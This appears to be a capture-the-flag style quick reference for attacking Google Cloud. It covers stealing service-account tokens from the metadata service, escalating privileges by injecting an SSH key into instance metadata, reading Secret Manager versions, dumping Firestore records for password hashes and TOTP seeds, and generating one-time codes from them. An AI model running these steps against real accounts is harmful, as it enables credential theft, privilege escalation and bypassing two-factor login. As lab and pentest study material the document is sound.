# GCP Service Quick Reference

## Identity and authentication

```bash
gcloud auth activate-service-account --key-file=key.json
gcloud config set project <project-id>
gcloud auth list                                   # who am I?
```

## IAM enumeration

```bash
# Try project IAM policy (often denied, always worth trying)
gcloud projects get-iam-policy <project-id>

# List custom roles (often readable)
gcloud iam roles list --project <project-id>
gcloud iam roles describe <RoleName> --project <project-id>

# Check instance SA
gcloud compute instances describe <instance-name>
# Look for: serviceAccounts[].email and scopes
```

## Cloud Storage (gsutil)

```bash
gsutil ls                                          # list all buckets
gsutil ls gs://<bucket>/                           # list contents
gsutil ls -a gs://<bucket>/<path>/                 # ALL versions including deleted

# Download specific version (generation number)
gsutil cp 'gs://<bucket>/<path>#<generation>' .

# Check bucket IAM
gsutil iam get gs://<bucket>/
```

## GCP Metadata service (IMDS)

```bash
# From inside a GCP VM
# Service account token
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token

# All metadata
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/

# Project ID
curl -H "Metadata-Flavor: Google" \
  http://metadata.google.internal/computeMetadata/v1/project/project-id
```

## Metadata injection — privilege escalation

Requires: `compute.instances.setMetadata` on the target instance.

```bash
NEWUSER="attacker"
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""
echo "$NEWUSER:$(cat ./key.pub)" > meta.txt

gcloud compute instances add-metadata <instance-name> \
  --metadata-from-file ssh-keys=meta.txt

# New user auto-added to google-sudoers group
ssh -i ./key $NEWUSER@localhost
sudo cat /root/flag.txt
```

## Secret Manager

```bash
gcloud secrets list --project <project-id>
gcloud secrets versions list <secret-name> --project <project-id>

# Access specific version
gcloud secrets versions access latest --secret=<name> --project <project-id>
gcloud secrets versions access 1 --secret=<name> --project <project-id>
gcloud secrets versions access 2 --secret=<name> --project <project-id>
```

## Firestore — Node.js SDK

```bash
npm install firebase-admin
```

```javascript
// list-collections.js — enumerate all collections
const { initializeApp, cert } = require('firebase-admin/app');
const { getFirestore } = require('firebase-admin/firestore');
initializeApp({ credential: cert(require('./firestore.json')) });
const db = getFirestore();
db.listCollections().then(snap =>
  snap.forEach(s => console.log(s["_queryOptions"].collectionId))
);
```

```javascript
// dump-collection.js — dump all documents in a collection
const { initializeApp, cert } = require('firebase-admin/app');
const { getFirestore } = require('firebase-admin/firestore');
initializeApp({ credential: cert(require('./firestore.json')) });
const db = getFirestore();

async function dump() {
  const snap = await db.collection('<collection-name>').get();
  snap.forEach(doc => console.log(doc.id, '=>', doc.data()));
}
dump();
```

Common fields to look for: `username`, `password` (bcrypt hash), `secret` (base32 TOTP seed).

## TOTP generation from recovered secret

```bash
# If a base32 string appears in Firestore or any other recovered data:
oathtool -b <BASE32_SECRET> --totp

python3 -c "import pyotp; print(pyotp.TOTP('<BASE32>').now())"
```

## Cloud Functions

```bash
gcloud functions list --project <project-id>
gcloud functions describe <name> --project <project-id>
gcloud functions call <name> --project <project-id>
```

## GKE / Kubernetes

```bash
gcloud container clusters list --project <project-id>
gcloud container clusters get-credentials <cluster> --zone <zone>
kubectl auth can-i --list
kubectl get secrets -n default
```
